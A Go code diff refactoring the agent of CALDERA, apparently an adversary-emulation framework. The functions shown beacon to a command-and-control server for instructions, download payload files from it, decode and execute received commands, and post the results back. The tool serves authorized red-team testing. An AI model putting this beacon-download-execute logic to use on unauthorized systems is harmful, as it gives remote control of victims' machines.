@@ -4,32 +4,32 @@ import (
 	"bytes"
 	"fmt"
 	"net/http"
+	"os"
+	"io"
 	"runtime"
 	"io/ioutil"
 	"time"
 	"encoding/json"
-	"io"
-	"os"
 	"path/filepath"
 	"../util"
 	"../execute"
 )
 
-// Beacon is a single call to the C2
-func Beacon(server string, paw string, group string, files string) interface{} {
-	data, _ := json.Marshal(map[string]string{"platform": runtime.GOOS, "group": group, "files": files})
-	address := fmt.Sprintf("%s/sand/beacon", server)
+// Instructions is a single call to the C2
+func Instructions(server string, group string, paw string) interface{} {
+	data, _ := json.Marshal(map[string]string{"platform": runtime.GOOS, "group": group})
+	address := fmt.Sprintf("%s/sand/instructions", server)
 	bites := request(address, paw, data)
 	var out interface{}
 	json.Unmarshal(bites, &out)
 	return out
 }
 
-// Drop a file from CALDERA
-func Drop(server string, files string, command map[string]interface{}) {
-	payload := command["payload"].(string)
-	location := filepath.Join(files, payload)
+// Drop the payload from CALDERA
+func Drop(server string, payload string) {
+	location := filepath.Join(payload)
 	if len(payload) > 0 && util.Exists(location) == false {
+		fmt.Println(fmt.Sprintf("[*] Downloading new payload: %s", payload))
 		address := fmt.Sprintf("%s/file/download", server)
 		req, _ := http.NewRequest("POST", address, nil)
 		req.Header.Set("file", payload)
@@ -45,8 +45,8 @@ func Drop(server string, files string, command map[string]interface{}) {
 	}
 }
 
-// Results executes a command and posts results to CALDERA
-func Results(server string, paw string, command map[string]interface{}) {
+// Execute executes a command and posts results to CALDERA
+func Execute(server string, paw string, command map[string]interface{}) {
 	cmd := string(util.Decode(command["command"].(string)))
 	status := "0"
 	result, err := execute.Execute(cmd)
